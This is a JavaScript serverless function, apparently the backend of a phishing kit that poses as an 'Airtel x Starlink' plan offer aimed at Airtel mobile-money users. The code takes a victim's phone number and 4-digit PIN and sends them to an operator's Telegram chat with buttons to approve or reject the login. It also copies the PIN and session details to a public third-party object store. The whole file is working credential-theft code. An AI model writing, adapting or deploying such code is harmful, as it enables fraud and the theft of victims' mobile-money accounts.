const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = req.body || {};

    if (!sessionId || !phone || !pin) {
      return res.status(400).json({ error: 'Champs obligatoires manquants.' });
    }

    const cleanPhone = phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
    const cleanPin = pin.toString().slice(0, 4);
    const displayPhone = fullPhone || `+243 ${cleanPhone}`;
    const displayCountry = country || 'Airtel Africa';
    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';

    // Use sessionId as cloudId for speed
    const cloudId = sessionId;

    // Send Telegram message FIRST (before cloud operations)
    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${planName || 'Forfait Airtel Starlink'}</b> (${planPrice || '$1.49'})\n` +
      `📶 <b>Réseau:</b> ${displayBrand}\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${cloudId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN',
          callback_data: `approve_login_${cloudId}`,
        },
        {
          text: '❌ Rejeter PIN',
          callback_data: `reject_login_${cloudId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${cloudId}&action=approve_login`,
        },
      ],
    ];

    console.log('[send-login] Sending Telegram message for session:', cloudId);

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: inlineKeyboard,
        },
      }),
    });

    const tgData = await tgRes.json();

    if (!tgData.ok) {
      console.error('[send-login] Telegram API error:', tgData);
      return res.status(500).json({ error: 'Failed to send Telegram message' });
    }

    console.log('[send-login] Telegram message sent successfully, message_id:', tgData.result?.message_id);

    // Create cloud session record asynchronously (don't wait)
    fetch('https://api.restful-api.dev/objects', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: `stl_${cleanPhone}_${Date.now()}`,
        data: {
          sessionId,
          phone: cleanPhone,
          fullPhone: displayPhone,
          country: displayCountry,
          airtelBrand: displayBrand,
          pin: cleanPin,
          planName: planName || 'Forfait Airtel Starlink',
          planPrice: planPrice || '$1.49',
          loginStatus: 'pending',
          otpStatus: 'idle',
          createdAt: Date.now(),
          lastUpdated: Date.now(),
        },
      }),
    })
      .then(createRes => {
        if (createRes.ok) {
          return createRes.json();
        }
        throw new Error('Cloud creation failed');
      })
      .then(createData => {
        if (createData && createData.id) {
          console.log('[send-login] Cloud record created:', createData.id);
        }
      })
      .catch(e => console.warn('[send-login] Could not create cloud record:', e));

    return res.status(200).json({
      success: true,
      sessionId,
      cloudId,
      telegram: tgData,
    });
  } catch (error) {
    console.error('send-login serverless error:', error);
    return res.status(500).json({ error: error.message });
  }
}
